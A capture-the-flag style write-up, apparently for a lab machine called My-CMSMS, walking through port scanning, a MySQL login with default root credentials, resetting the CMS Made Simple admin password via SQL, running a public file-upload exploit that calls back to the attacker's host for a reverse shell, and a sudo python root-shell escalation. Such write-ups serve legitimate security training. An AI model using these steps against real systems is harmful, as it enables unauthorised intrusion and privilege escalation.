# My-CMSMS

## Nmap

```
sudo nmap 192.168.152.74 -p- -sS -sV

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
3306/tcp  open  mysql   MySQL 8.0.19
33060/tcp open  mysqlx?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Checking out port 80 takes us to the default page for CMS made simple.

![](<../../../.gitbook/assets/image (1177).png>)

I then run dirsearch.py against the host which also discovered phpmyadmin which was locked behind http-basic-auth.

```
python3 dirsearch.py -u http://192.168.152.74  -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 60 --full-url 
```

![](<../../../.gitbook/assets/image (1178).png>)

I attempted to bruteforce the login for phpmyadmin and for CMSMS login. I was unable to find any valid credentials for either.

I was however, able to login to MySQL remotely with the credentials `root:root`.

```
mysql -u root -p -h 192.168.152.74
```

![](<../../../.gitbook/assets/image (1179).png>)

From here we can view the databases and move into the cmsms\_db database.

```
use cmsms_db;
show tables;
```

![](<../../../.gitbook/assets/image (1180).png>)

Looking at the tables that exists in the database we select all columns from cms\_users table.

```
select * from cms_users;
```

![](<../../../.gitbook/assets/image (1181).png>)

This reveals a MD5 password hash for the admin account. I was unable to crack this with several word lists however.

As we are the root account on MySQL we can instead change the password to something we know and use this to login to CMSMS.

Run the following command to create a new password of 'weakpass' for the admin user:

`update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'weakpass'))) where username = 'admin'`

{% hint style="info" %}
[https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery](https://cmscanbesimple.org/blog/cms-made-simple-admin-password-recovery)
{% endhint %}

The password has now changed:

![](<../../../.gitbook/assets/image (1183).png>)

We can then move over to the /admin/ directory in the browser and login with the new credentials.

![](<../../../.gitbook/assets/image (1185) (1).png>)

Searching for exploits on CMSMS now that we are authenticated gives a few results.

![](<../../../.gitbook/assets/image (1186).png>)

As we are running version 2.2.13 I will try the Arbitary file upload for version 2.2.14.

{% embed url="https://www.exploit-db.com/exploits/48779" %}

Once the python script was downloaded I executed with the following syntax:

```
python3 48779.py --url http://192.168.152.74/admin/login.php -u admin -p weakpass -lhost 192.168.49.152 -l 80
```

![](<../../../.gitbook/assets/image (1187).png>)

When ready I set a `netcat` listener and prompted the script to continue resulting in a shell as www-data.

![](<../../../.gitbook/assets/image (1188).png>)

Moving around the target machine we have a .htpasswd file hidden in `/var/www/html/admin/`. When running `cat` on the file we get the value `TUZaRzIzM1ZPSTVGRzJESk1WV0dJUUJSR0laUT09PT0=`.

From here we can decode with base64 then base32 as this string is double encoded.

![](<../../../.gitbook/assets/image (1189).png>)

We can then use `su` to switch to the armour account and login with the password we have discovered.

![](<../../../.gitbook/assets/image (1190).png>)

Checking `sudo -l` shows we can run python as root without declaring a password.

![](<../../../.gitbook/assets/image (1191).png>)

We can then spawn a root shell with python.

```
sudo python -c 'import os; os.system("/bin/sh")'
```

![](<../../../.gitbook/assets/image (1192).png>)
